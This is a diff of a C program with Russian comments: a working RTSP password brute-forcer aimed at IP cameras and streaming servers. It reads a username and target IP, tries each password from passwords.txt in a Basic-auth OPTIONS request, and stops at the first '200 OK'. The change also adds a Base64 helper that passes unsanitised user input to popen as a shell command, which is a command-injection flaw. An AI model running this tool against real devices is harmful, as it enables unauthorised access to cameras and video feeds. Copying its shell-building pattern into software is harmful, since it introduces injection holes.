@@ -4,50 +4,48 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 2048
 #define PASSWORD_LENGTH 100
 
-// Таблица Base64
-static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+// Функция для кодирования в Base64 через системный вызов (Termux-friendly)
+char *base64_encode(const char *input) {
+    char command[BUFFER_SIZE];
+    char *result = malloc(BUFFER_SIZE);
+    FILE *fp;
 
-// Кодировка в base64
-char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
-    size_t i, j;
-    *output_length = 4 * ((input_length + 2) / 3);
-    char *encoded_data = malloc(*output_length + 1);
-    if (encoded_data == NULL) return NULL;
-
-    for (i = 0, j = 0; i < input_length;) {
-        uint32_t octet_a = i < input_length ? data[i++] : 0;
-        uint32_t octet_b = i < input_length ? data[i++] : 0;
-        uint32_t octet_c = i < input_length ? data[i++] : 0;
-
-        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;
-
-        encoded_data[j++] = base64_table[(triple >> 18) & 0x3F];
-        encoded_data[j++] = base64_table[(triple >> 12) & 0x3F];
-        encoded_data[j++] = base64_table[(triple >> 6) & 0x3F];
-        encoded_data[j++] = base64_table[triple & 0x3F];
+    snprintf(command, sizeof(command), "echo -n \"%s\" | base64", input);
+    fp = popen(command, "r");
+    if (!fp) {
+        perror("Ошибка при запуске base64");
+        free(result);
+        return NULL;
     }
 
-    for (i = 0; i < (3 - input_length % 3) % 3; i++)
-        encoded_data[*output_length - 1 - i] = '=';
+    fgets(result, BUFFER_SIZE, fp);
+    result[strcspn(result, "\n")] = '\0'; // Удаляем \n
 
-    encoded_data[*output_length] = '\0';
-    return encoded_data;
+    pclose(fp);
+    return result;
 }
 
-// Брутфорс RTSP
-void rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
+// Функция для брутфорса одного пароля
+int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
     int sock;
     struct sockaddr_in server_addr;
     char request[BUFFER_SIZE];
     char response[BUFFER_SIZE];
+    char userpass[200];
 
+    snprintf(userpass, sizeof(userpass), "%s:%s", username, password);
+    char *auth_encoded = base64_encode(userpass);
+    if (!auth_encoded) return 0;
+
+    // Создаём сокет
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        perror("Сокет ошибка");
-        return;
+        perror("Ошибка создания сокета");
+        free(auth_encoded);
+        return 0;
     }
 
     server_addr.sin_family = AF_INET;
@@ -57,63 +55,65 @@ void rtsp_bruteforce(const char *target_ip, int target_port, const char *usernam
     if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Ошибка подключения");
         close(sock);
-        return;
+        free(auth_encoded);
+        return 0;
     }
 
-    // 🔐 Создаём строку user:pass
-    char auth_raw[200];
-    snprintf(auth_raw, sizeof(auth_raw), "%s:%s", username, password);
-
-    // 🔐 Кодируем в base64
-    size_t encoded_length;
-    char *auth_encoded = base64_encode((const unsigned char *)auth_raw, strlen(auth_raw), &encoded_length);
-
-    // 📡 Формируем RTSP-запрос
     snprintf(request, sizeof(request),
              "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
              "CSeq: 1\r\n"
              "Authorization: Basic %s\r\n\r\n",
-             target_ip, auth_encoded); // ← вот здесь вставляется base64
+             target_ip, auth_encoded);
 
-    // Отправляем
     send(sock, request, strlen(request), 0);
-
-    // Получаем ответ
     recv(sock, response, sizeof(response) - 1, 0);
     response[sizeof(response) - 1] = '\0';
 
-    // ✅ Проверка ответа
-    if (strstr(response, "200 OK") != NULL) {
-        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password); // Зелёный
+    if (strstr(response, "200 OK")) {
+        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);
+        close(sock);
+        free(auth_encoded);
+        return 1;
     } else {
-        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password); // Красный
+        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password);
     }
 
-    free(auth_encoded);
     close(sock);
+    free(auth_encoded);
+    return 0;
 }
 
 int main() {
-    char target_ip[16];
+    char target_ip[64];
     int target_port = 554;
     char username[100];
+    char password[PASSWORD_LENGTH];
 
     printf("Введите IP RTSP сервера: ");
-    scanf("%15s", target_ip);
+    scanf("%63s", target_ip);
+    getchar(); // съедаем лишний Enter
 
-    printf("Введите логин (например admin): ");
-    scanf("%99s", username);
+    printf("Введите логин: ");
+    fgets(username, sizeof(username), stdin);
+    username[strcspn(username, "\n")] = '\0';
 
     FILE *file = fopen("passwords.txt", "r");
     if (!file) {
-        perror("Не удалось открыть файл passwords.txt");
+        perror("Ошибка: файл passwords.txt не найден");
         return 1;
     }
 
-    char buffer[PASSWORD_LENGTH];
-    while (fgets(buffer, PASSWORD_LENGTH, file) != NULL) {
-        buffer[strcspn(buffer, "\n")] = 0;
-        rtsp_bruteforce(target_ip, target_port, username, buffer);
+    printf("\nНачинаем брутфорс...\n\n");
+
+    while (fgets(password, PASSWORD_LENGTH, file)) {
+        password[strcspn(password, "\n")] = 0;
+
+        if (rtsp_bruteforce(target_ip, target_port, username, password)) {
+            printf("\n\033[1;34m[*] Пароль найден. Программа завершена.\033[0m\n");
+            break;
+        }
+
+        sleep(1); // немного подождать, чтобы не заспамить сервер
     }
 
     fclose(file);
